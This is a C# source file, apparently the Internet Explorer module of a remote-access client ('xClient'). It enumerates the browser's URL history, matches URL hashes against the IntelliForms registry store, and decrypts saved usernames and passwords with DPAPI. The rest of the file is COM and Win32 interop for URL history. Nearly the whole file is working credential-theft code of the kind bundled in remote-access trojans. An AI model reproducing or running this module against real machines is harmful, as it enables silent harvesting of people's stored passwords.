using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using xClient.Core.Data;
using xClient.Core.Helper;

namespace xClient.Core.Recovery.Browsers
{
    public static class InternetExplorer
    {
        #region Public Members
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();

            try
            {
                using (ExplorerUrlHistory ieHistory = new ExplorerUrlHistory())
                {
                    List<string[]> dataList = new List<string[]>();

                    foreach (STATURL item in ieHistory)
                    {
                        try
                        {
                            if (DecryptIePassword(item.UrlString, dataList))
                            {
                                foreach (string[] loginInfo in dataList)
                                {
                                    data.Add(new RecoveredAccount() { Username = loginInfo[0], Password = loginInfo[1], URL = item.UrlString, Application = "InternetExplorer" });
                                }
                            }
                        }
                        catch (Exception)
                        {
                            // TODO: Add packet sending for error
                        }
                    }
                }
            }
            catch (Exception)
            {
                // TODO: Add packet sending for error
            }

            return data;
        }
        
        public static List<RecoveredAccount> GetSavedCookies()
        {
            return new List<RecoveredAccount>();
        }
        #endregion
        #region Private Methods
        private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

        static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return stuff;

        }
        static bool DecryptIePassword(string url, List<string[]> dataList)
        {
            byte[] cypherBytes;

            //Get the hash for the passed URL
            string urlHash = GetURLHashString(url);

            //Check if this hash matches with stored hash in registry
            if (!DoesURLMatchWithHash(urlHash))
                return false;

            //Now retrieve the encrypted credentials for this registry hash entry....
            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
            {
                if (key == null) return false;

                //Retrieve encrypted data for this website hash...
                //First get the value...
                cypherBytes = (byte[])key.GetValue(urlHash);
            }

            // to use URL as optional entropy we must include trailing null character
            byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2);

            //Now decrypt the Autocomplete credentials....
            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);

            var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(decryptedBytes);

            //check if the data contains enough length....
            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
            {

                //Get the total number of secret entries (username & password) for the site...
                // user name and passwords are accounted as separate secrets, but will be threated in pairs here.
                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;

                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length);

                if (dataList == null)
                    dataList = new List<string[]>();
                else
                    dataList.Clear();

                offset = Marshal.SizeOf(ieAutoHeader);
                // Each time process 2 secret entries for username & password
                for (int i = 0; i < dwTotalSecrets; i++)
                {

                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);

                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);

                    string[] dataTriplet = new string[3]; // store data such as url, username & password for each secret

                    byte[] secret1 = new byte[secEntry.dwLength * 2];
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length);

                    dataTriplet[0] = Encoding.Unicode.GetString(secret1);

                    // read another secret entry
                    offset += sizeOfSecretEntry;
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);

                    byte[] secret2 = new byte[secEntry.dwLength * 2]; //Get the next secret's offset i.e password
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length);

                    dataTriplet[1] = Encoding.Unicode.GetString(secret2);

                    dataTriplet[2] = urlHash;
                    //move to next entry
                    dataList.Add(dataTriplet);
                    offset += sizeOfSecretEntry;

                }

            }
            return true;
        }

        static bool DoesURLMatchWithHash(string urlHash)
        {
            // enumerate values of the target registry
            bool result = false;

            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
            {
                if (key == null) return false;

                if (key.GetValueNames().Any(value => value == urlHash))
                    result = true;
            }
            return result;
        }

        static string GetURLHashString(string wstrURL)
        {
            IntPtr hProv = IntPtr.Zero;
            IntPtr hHash = IntPtr.Zero;

            CryptAcquireContext(out hProv, String.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

            if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrURL);

            StringBuilder urlHash = new StringBuilder(42);
            if (CryptHashData(hHash, bytesToCrypt, (wstrURL.Length + 1) * 2, 0))
            {

                // retrieve 20 bytes of hash value
                uint dwHashLen = 20;
                byte[] buffer = new byte[dwHashLen];

                //Get the hash value now...
                if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                //Convert the 20 byte hash value to hexadecimal string format...
                byte tail = 0; // used to calculate value for the last 2 bytes
                urlHash.Length = 0;
                for (int i = 0; i < dwHashLen; ++i)
                {

                    byte c = buffer[i];
                    tail += c;
                    urlHash.AppendFormat("{0:X2}", c);
                }
                urlHash.AppendFormat("{0:X2}", tail);

                CryptDestroyHash(hHash);

            }
            CryptReleaseContext(hProv, 0);

            return urlHash.ToString();
        }
        #endregion
        #region Win32 Interop

        // IE Autocomplete Secret Data structures decoded by Nagareshwar
        //
        //One Secret Info header specifying number of secret strings
        [StructLayout(LayoutKind.Sequential)]
        struct IESecretInfoHeader
        {

            public uint dwIdHeader;     // value - 57 49 43 4B
            public uint dwSize;         // size of this header....24 bytes
            public uint dwTotalSecrets; // divide this by 2 to get actual website entries
            public uint unknown;
            public uint id4;            // value - 01 00 00 00
            public uint unknownZero;

        };

        //Main Decrypted Autocomplete Header data
        [StructLayout(LayoutKind.Sequential)]
        struct IEAutoComplteSecretHeader
        {

            public uint dwSize;                        //This header size
            public uint dwSecretInfoSize;              //= sizeof(IESecretInfoHeader) + numSecrets * sizeof(SecretEntry);
            public uint dwSecretSize;                  //Size of the actual secret strings such as username & password
            public IESecretInfoHeader IESecretHeader;  //info about secrets such as count, size etc
            //SecretEntry secEntries[numSecrets];      //Header for each Secret String
            //WCHAR secrets[numSecrets];               //Actual Secret String in Unicode

        };

        // Header describing each of the secrets such ass username/password.
        // Two secret entries having same SecretId are paired
        [StructLayout(LayoutKind.Explicit)]
        struct SecretEntry
        {

            [FieldOffset(0)]
            public uint dwOffset;           //Offset of this secret entry from the start of secret entry strings

            [FieldOffset(4)]
            public byte SecretId;           //UNIQUE id associated with the secret
            [FieldOffset(5)]
            public byte SecretId1;
            [FieldOffset(6)]
            public byte SecretId2;
            [FieldOffset(7)]
            public byte SecretId3;
            [FieldOffset(8)]
            public byte SecretId4;
            [FieldOffset(9)]
            public byte SecretId5;
            [FieldOffset(10)]
            public byte SecretId6;
            [FieldOffset(11)]
            public byte SecretId7;

            [FieldOffset(12)]
            public uint dwLength;           //length of this secret

        };

        private const uint PROV_RSA_FULL = 1;
        private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;

        private const int ALG_CLASS_HASH = 4 << 13;
        private const int ALG_SID_SHA1 = 4;
        private enum ALG_ID
        {

            CALG_MD5 = 0x00008003,
            CALG_SHA1 = ALG_CLASS_HASH | ALG_SID_SHA1

        }
        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

        [DllImport("advapi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);

        [DllImport("advapi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptDestroyHash(IntPtr hHash);

        private enum HashParameters
        {

            HP_ALGID = 0x0001,   // Hash algorithm
            HP_HASHVAL = 0x0002, // Hash value
            HP_HASHSIZE = 0x0004 // Hash value size

        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

        #endregion
    }

    public class ExplorerUrlHistory : IDisposable
    {

        private readonly IUrlHistoryStg2 obj;
        private UrlHistoryClass urlHistory;
        private List<STATURL> _urlHistoryList;
        /// <summary>
        /// Default constructor for UrlHistoryWrapperClass
        /// </summary>
        public ExplorerUrlHistory()
        {

            urlHistory = new UrlHistoryClass();
            obj = (IUrlHistoryStg2)urlHistory;
            STATURLEnumerator staturlEnumerator = new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
            _urlHistoryList = new List<STATURL>();
            staturlEnumerator.GetUrlHistory(_urlHistoryList);

        }

        public int Count
        {
            get
            {
                return _urlHistoryList.Count;
            }
        }


        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        public void Dispose()
        {

            Marshal.ReleaseComObject(obj);
            urlHistory = null;

        }

        /// <summary>
        /// Places the specified URL into the history. If the URL does not exist in the history, an entry is created in the history.
        /// If the URL does exist in the history, it is overwritten.
        /// </summary>
        /// <param name="pocsUrl">the string of the URL to place in the history</param>
        /// <param name="pocsTitle">the string of the title associated with that URL</param>
        /// <param name="dwFlags">the flag which indicate where a URL is placed in the history.
        /// <example><c>ADDURL_FLAG.ADDURL_ADDTOHISTORYANDCACHE</c></example>
        /// </param>
        public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
        {

            obj.AddUrl(pocsUrl, pocsTitle, dwFlags);

        }

        /// <summary>
        /// Deletes all instances of the specified URL from the history. does not work!
        /// </summary>
        /// <param name="pocsUrl">the string of the URL to delete.</param>
        /// <param name="dwFlags"><c>dwFlags = 0</c></param>
        public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
        {

            try
            {

                obj.DeleteUrl(pocsUrl, dwFlags);
                return true;

            }
            catch (Exception)
            {

                return false;

            }

        }


        /// <summary>
        ///Queries the history and reports whether the URL passed as the pocsUrl parameter has been visited by the current user.
        /// </summary>
        /// <param name="pocsUrl">the string of the URL to querythe string of the URL to query.</param>
        /// <param name="dwFlags">STATURL_QUERYFLAGS Enumeration
        /// <example><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></example></param>
        /// <returns>Returns STATURL structure that received additional URL history information. If the returned  STATURL's pwcsUrl is not null, Queried URL has been visited by the current user.
        /// </returns>
        public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
        {

            var lpSTATURL = new STATURL();

            try
            {

                //In this case, queried URL has been visited by the current user.
                obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
                //lpSTATURL.pwcsUrl is NOT null;
                return lpSTATURL;

            }
            catch (FileNotFoundException)
            {

                //Queried URL has not been visited by the current user.
                //lpSTATURL.pwcsUrl is set to null;
                return lpSTATURL;

            }

        }

        /// <summary>
        /// Delete all the history except today's history, and Temporary Internet Files.
        /// </summary>
        public void ClearHistory()
        {

            obj.ClearHistory();

        }

        /// <summary>
        /// Create an enumerator that can iterate through the history cache. ExplorerUrlHistory does not implement IEnumerable interface
        /// </summary>
        /// <returns>Returns [{STATURLEnumerator}: M.S. : GetEnumerator() returns IEnumerator instead.] object that can iterate through the history cache.</returns>

        public STATURLEnumerator GetEnumerator()
        {

            return new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);

        }

        public STATURL this[int index]
        {

            get
            {

                if (index < _urlHistoryList.Count && index >= 0)
                    return _urlHistoryList[index];
                throw new IndexOutOfRangeException();

            }
            set
            {

                if (index < _urlHistoryList.Count && index >= 0)
                    _urlHistoryList[index] = value;
                else throw new IndexOutOfRangeException();

            }

        }

        #region Nested type: STATURLEnumerator

        /// <summary>
        /// The inner class that can iterate through the history cache. STATURLEnumerator does not implement IEnumerator interface.
        /// The items in the history cache changes often, and enumerator needs to reflect the data as it existed at a specific point in time.
        /// </summary>
        public class STATURLEnumerator
        {

            private readonly IEnumSTATURL _enumerator;
            private int _index;
            private STATURL _staturl;

            /// <summary>
            /// Constructor for <c>STATURLEnumerator</c> that accepts IEnumSTATURL object that represents the <c>IEnumSTATURL</c> COM Interface.
            /// </summary>
            /// <param name="enumerator">the <c>IEnumSTATURL</c> COM Interface</param>
            public STATURLEnumerator(IEnumSTATURL enumerator)
            {

                _enumerator = enumerator;

            }

            //Advances the enumerator to the next item of the url history cache.

            /// <summary>
            /// Gets the current item in the url history cache.
            /// </summary>
            public STATURL Current
            {

                get
                {
                    return _staturl;
                }

            }

            /// <summary>
            /// Advances the enumerator to the next item of the url history cache.
            /// </summary>
            /// <returns>true if the enumerator was successfully advanced to the next element;
            ///  false if the enumerator has passed the end of the url history cache.
            ///  </returns>
            public bool MoveNext()
            {

                _staturl = new STATURL();
                _enumerator.Next(1, ref _staturl, out _index);
                if (_index == 0)
                    return false;
                return true;

            }

            /// <summary>
            /// Skips a specified number of Call objects in the enumeration sequence. does not work!
            /// </summary>
            /// <param name="celt"></param>
            public void Skip(int celt)
            {

                _enumerator.Skip(celt);

            }

            /// <summary>
            /// Resets the enumerator interface so that it begins enumerating at the beginning of the history.
            /// </summary>
            public void Reset()
            {

                _enumerator.Reset();

            }

            /// <summary>
            /// Creates a duplicate enumerator containing the same enumeration state as the current one. does not work!
            /// </summary>
            /// <returns>duplicate STATURLEnumerator object</returns>
            public STATURLEnumerator Clone()
            {

                IEnumSTATURL ppenum;
                _enumerator.Clone(out ppenum);
                return new STATURLEnumerator(ppenum);

            }

            /// <summary>
            /// Define filter for enumeration. MoveNext() compares the specified URL with each URL in the history list to find matches.
            /// MoveNext() then copies the list of matches to a buffer. SetFilter method is used to specify the URL to compare.
            /// </summary>
            /// <param name="poszFilter">The string of the filter.
            /// <example>SetFilter('http://', STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL)  retrieves only entries starting with 'http.//'. </example>
            /// </param>
            /// <param name="dwFlags">STATURL_QUERYFLAGS Enumeration<exapmle><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></exapmle></param>
            public void SetFilter(string poszFilter, STATURLFLAGS dwFlags)
            {

                _enumerator.SetFilter(poszFilter, dwFlags);

            }

            /// <summary>
            ///Enumerate the items in the history cache and store them in the IList object.
            /// </summary>
            /// <param name="list">IList object
            /// <example><c>ArrayList</c>object</example>
            /// </param>
            public void GetUrlHistory(IList list)
            {

                while (true)
                {

                    _staturl = new STATURL();
                    _enumerator.Next(1, ref _staturl, out _index);
                    if (_index == 0)
                        break;
                    //if (_staturl.URL.StartsWith("http"))
                    list.Add(_staturl);

                }
                _enumerator.Reset();

            }

        }

        #endregion

    }

    public class Win32api
    {

        #region shlwapi_URL enum

        /// <summary>
        /// Used by CannonializeURL method.
        /// </summary>
        [Flags]
        public enum shlwapi_URL : uint
        {

            /// <summary>
            /// Treat "/./" and "/../" in a URL string as literal characters, not as shorthand for navigation.
            /// </summary>
            URL_DONT_SIMPLIFY = 0x08000000,

            /// <summary>
            /// Convert any occurrence of "%" to its escape sequence.
            /// </summary>
            URL_ESCAPE_PERCENT = 0x00001000,

            /// <summary>
            /// Replace only spaces with escape sequences. This flag takes precedence over URL_ESCAPE_UNSAFE, but does not apply to opaque URLs.
            /// </summary>
            URL_ESCAPE_SPACES_ONLY = 0x04000000,

            /// <summary>
            /// Replace unsafe characters with their escape sequences. Unsafe characters are those characters that may be altered during transport across the Internet, and include the (<, >, ", #, {,}, |, \, ^, ~, [, ], and ') characters. This flag applies to all URLs, including opaque URLs.
            /// </summary>
            URL_ESCAPE_UNSAFE = 0x20000000,

            /// <summary>
            /// Combine URLs with client-defined pluggable protocols, according to the World Wide Web Consortium (W3C) specification. This flag does not apply to standard protocols such as ftp, http, gopher, and so on. If this flag is set, UrlCombine does not simplify URLs, so there is no need to also set URL_DONT_SIMPLIFY.
            /// </summary>
            URL_PLUGGABLE_PROTOCOL = 0x40000000,

            /// <summary>
            /// Un-escape any escape sequences that the URLs contain, with two exceptions. The escape sequences for "?" and "#" are not un-escaped. If one of the URL_ESCAPE_XXX flags is also set, the two URLs are first un-escaped, then combined, then escaped.
            /// </summary>
            URL_UNESCAPE = 0x10000000

        }

        #endregion

        public const uint SHGFI_ATTR_SPECIFIED = 0x20000;
        public const uint SHGFI_ATTRIBUTES = 0x800;
        public const uint SHGFI_PIDL = 0x8;
        public const uint SHGFI_DISPLAYNAME = 0x200;
        public const uint SHGFI_USEFILEATTRIBUTES = 0x10;
        public const uint FILE_ATTRIBUTRE_NORMAL = 0x4000;
        public const uint SHGFI_EXETYPE = 0x2000;
        public const uint SHGFI_SYSICONINDEX = 0x4000;
        public const uint ILC_COLORDDB = 0x1;
        public const uint ILC_MASK = 0x0;
        public const uint ILD_TRANSPARENT = 0x1;
        public const uint SHGFI_ICON = 0x100;
        public const uint SHGFI_LARGEICON = 0x0;
        public const uint SHGFI_SHELLICONSIZE = 0x4;
        public const uint SHGFI_SMALLICON = 0x1;
        public const uint SHGFI_TYPENAME = 0x400;
        public const uint SHGFI_ICONLOCATION = 0x1000;

        [DllImport("shlwapi.dll")]
        public static extern int UrlCanonicalize(
        string pszUrl,
        StringBuilder pszCanonicalized,
        ref int pcchCanonicalized,
        shlwapi_URL dwFlags
        );


        /// <summary>
        /// Takes a URL string and converts it into canonical form
        /// </summary>
        /// <param name="pszUrl">URL string</param>
        /// <param name="dwFlags">shlwapi_URL Enumeration. Flags that specify how the URL is converted to canonical form.</param>
        /// <returns>The converted URL</returns>
        public static string CannonializeURL(string pszUrl, shlwapi_URL dwFlags)
        {

            var buff = new StringBuilder(260);
            int s = buff.Capacity;
            int c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
            if (c == 0)
                return buff.ToString();
            else
            {

                buff.Capacity = s;
                c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
                return buff.ToString();

            }

        }

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool FileTimeToSystemTime
        (ref System.Runtime.InteropServices.ComTypes.FILETIME FileTime, ref SYSTEMTIME SystemTime);


        /// <summary>
        /// Converts a file time to DateTime format.
        /// </summary>
        /// <param name="filetime">FILETIME structure</param>
        /// <returns>DateTime structure</returns>
        public static DateTime FileTimeToDateTime(System.Runtime.InteropServices.ComTypes.FILETIME filetime)
        {

            var st = new SYSTEMTIME();
            FileTimeToSystemTime(ref filetime, ref st);
            try
            {

                return new DateTime(st.Year, st.Month, st.Day, st.Hour, st.Minute, st.Second, st.Milliseconds);

            }
            catch (Exception)
            {

                return DateTime.Now;

            }

        }

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool SystemTimeToFileTime([In] ref SYSTEMTIME lpSystemTime,
                                                                out System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime);


        /// <summary>
        /// Converts a DateTime to file time format.
        /// </summary>
        /// <param name="datetime">DateTime structure</param>
        /// <returns>FILETIME structure</returns>
        public static System.Runtime.InteropServices.ComTypes.FILETIME DateTimeToFileTime(DateTime datetime)
        {

            var st = new SYSTEMTIME();
            st.Year = (short)datetime.Year;
            st.Month = (short)datetime.Month;
            st.Day = (short)datetime.Day;
            st.Hour = (short)datetime.Hour;
            st.Minute = (short)datetime.Minute;
            st.Second = (short)datetime.Second;
            st.Milliseconds = (short)datetime.Millisecond;
            System.Runtime.InteropServices.ComTypes.FILETIME filetime;
            SystemTimeToFileTime(ref st, out filetime);
            return filetime;

        }

        //compares two file times.
        [DllImport("Kernel32.dll")]
        public static extern int CompareFileTime([In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime1,
[In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime2);


        //Retrieves information about an object in the file system.
        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi,
          uint cbSizeFileInfo, uint uFlags);

        #region Nested type: SYSTEMTIME
        public struct SYSTEMTIME
        {

            public Int16 Day;
            public Int16 DayOfWeek;
            public Int16 Hour;
            public Int16 Milliseconds;
            public Int16 Minute;
            public Int16 Month;
            public Int16 Second;
            public Int16 Year;

        }
        #endregion

    }

    #region WinAPI
    /// <summary>
    /// Contains information about a file object.
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct SHFILEINFO
    {

        public IntPtr hIcon;
        public IntPtr iIcon;
        public uint dwAttributes;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szDisplayName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
        public string szTypeName;

    };


    /// <summary>
    /// The helper class to sort in ascending order by FileTime(LastVisited).
    /// </summary>
    public class SortFileTimeAscendingHelper : IComparer
    {

        #region IComparer Members

        int IComparer.Compare(object a, object b)
        {

            var c1 = (STATURL)a;
            var c2 = (STATURL)b;

            return (CompareFileTime(ref c1.ftLastVisited, ref c2.ftLastVisited));

        }

        #endregion

        [DllImport("Kernel32.dll")]
        private static extern int CompareFileTime([In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime1, [In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime2);

        public static IComparer SortFileTimeAscending()
        {

            return new SortFileTimeAscendingHelper();

        }

    }

    public enum STATURL_QUERYFLAGS : uint
    {

        /// <summary>
        /// The specified URL is in the content cache.
        /// </summary>
        STATURL_QUERYFLAG_ISCACHED = 0x00010000,

        /// <summary>
        /// Space for the URL is not allocated when querying for STATURL.
        /// </summary>
        STATURL_QUERYFLAG_NOURL = 0x00020000,

        /// <summary>
        /// Space for the Web page's title is not allocated when querying for STATURL.
        /// </summary>
        STATURL_QUERYFLAG_NOTITLE = 0x00040000,

        /// <summary>
        /// //The item is a top-level item.
        /// </summary>
        STATURL_QUERYFLAG_TOPLEVEL = 0x00080000,

    }

    /// <summary>
    /// Flag on the dwFlags parameter of the STATURL structure, used by the SetFilter method.
    /// </summary>
    public enum STATURLFLAGS : uint
    {

        /// <summary>
        /// Flag on the dwFlags parameter of the STATURL structure indicating that the item is in the cache.
        /// </summary>
        STATURLFLAG_ISCACHED = 0x00000001,

        /// <summary>
        /// Flag on the dwFlags parameter of the STATURL structure indicating that the item is a top-level item.
        /// </summary>
        STATURLFLAG_ISTOPLEVEL = 0x00000002,

    }

    /// <summary>
    /// Used bu the AddHistoryEntry method.
    /// </summary>
    public enum ADDURL_FLAG : uint
    {

        /// <summary>
        /// Write to both the visited links and the dated containers.
        /// </summary>
        ADDURL_ADDTOHISTORYANDCACHE = 0,

        /// <summary>
        /// Write to only the visited links container.
        /// </summary>
        ADDURL_ADDTOCACHE = 1

    }


    /// <summary>
    /// The structure that contains statistics about a URL.
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct STATURL
    {

        /// <summary>
        /// Struct size
        /// </summary>
        public int cbSize;

        /// <summary>
        /// URL
        /// </summary>                                                                  
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwcsUrl;

        /// <summary>
        /// Page title
        /// </summary>
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwcsTitle;

        /// <summary>
        /// Last visited date (UTC)
        /// </summary>
        public System.Runtime.InteropServices.ComTypes.FILETIME ftLastVisited;

        /// <summary>
        /// Last updated date (UTC)
        /// </summary>
        public System.Runtime.InteropServices.ComTypes.FILETIME ftLastUpdated;

        /// <summary>
        /// The expiry date of the Web page's content (UTC)
        /// </summary>
        public System.Runtime.InteropServices.ComTypes.FILETIME ftExpires;

        /// <summary>
        /// Flags. STATURLFLAGS Enumaration.
        /// </summary>
        public STATURLFLAGS dwFlags;

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public string URL
        {

            get
            {
                return pwcsUrl;
            }

        }

        public string UrlString
        {

            get
            {

                int index = pwcsUrl.IndexOf('?');
                return index < 0 ? pwcsUrl : pwcsUrl.Substring(0, index);

            }

        }

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public string Title
        {

            get
            {

                if (pwcsUrl.StartsWith("file:"))
                    return Win32api.CannonializeURL(pwcsUrl, Win32api.shlwapi_URL.URL_UNESCAPE).Substring(8).Replace(
                        '/', '\\');
                return pwcsTitle;

            }

        }

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public DateTime LastVisited
        {

            get
            {

                return Win32api.FileTimeToDateTime(ftLastVisited).ToLocalTime();

            }

        }

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public DateTime LastUpdated
        {

            get
            {
                return Win32api.FileTimeToDateTime(ftLastUpdated).ToLocalTime();
            }

        }

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public DateTime Expires
        {

            get
            {

                try
                {

                    return Win32api.FileTimeToDateTime(ftExpires).ToLocalTime();

                }
                catch (Exception)
                {

                    return DateTime.Now;

                }

            }

        }

        public override string ToString()
        {

            return pwcsUrl;

        }

    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UUID
    {

        public int Data1;
        public short Data2;
        public short Data3;
        public byte[] Data4;

    }

    //Enumerates the cached URLs
    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("3C374A42-BAE4-11CF-BF7D-00AA006946EE")]
    public interface IEnumSTATURL
    {

        void Next(int celt, ref STATURL rgelt, out int pceltFetched); //Returns the next \"celt\" URLS from the cache
        void Skip(int celt); //Skips the next \"celt\" URLS from the cache. does not work.
        void Reset(); //Resets the enumeration
        void Clone(out IEnumSTATURL ppenum); //Clones this object
        void SetFilter([MarshalAs(UnmanagedType.LPWStr)] string poszFilter, STATURLFLAGS dwFlags);
        //Sets the enumeration filter

    }


    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
    public interface IUrlHistoryStg
    {

        void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags); //Adds a new history entry
        void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!
        void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags,
          ref STATURL lpSTATURL);

        //Returns a STATURL for a given URL
        void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut); //Binds to an object. does not work!
        object EnumUrls
        {

            [return: MarshalAs(UnmanagedType.IUnknown)]
            get;

        }

        //Returns an enumerator for URLs

    }

    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
    public interface IUrlHistoryStg2 : IUrlHistoryStg
    {

        new void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags); //Adds a new history entry
        new void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!
        new void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags, ref STATURL lpSTATURL);

        //Returns a STATURL for a given URL
        new void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut); //Binds to an object. does not work!
        new object EnumUrls
        {

            [return: MarshalAs(UnmanagedType.IUnknown)]
            get;

        }

        //Returns an enumerator for URLs
        void AddUrlAndNotify(string pocsUrl, string pocsTitle, int dwFlags, int fWriteHistory, object poctNotify, object punkISFolder);

        //does not work!
        void ClearHistory(); //Removes all history items

    }

    //UrlHistory class
    [ComImport]
    [Guid("3C374A40-BAE4-11CF-BF7D-00AA006946EE")]
    public class UrlHistoryClass
    {


    }
#endregion
}
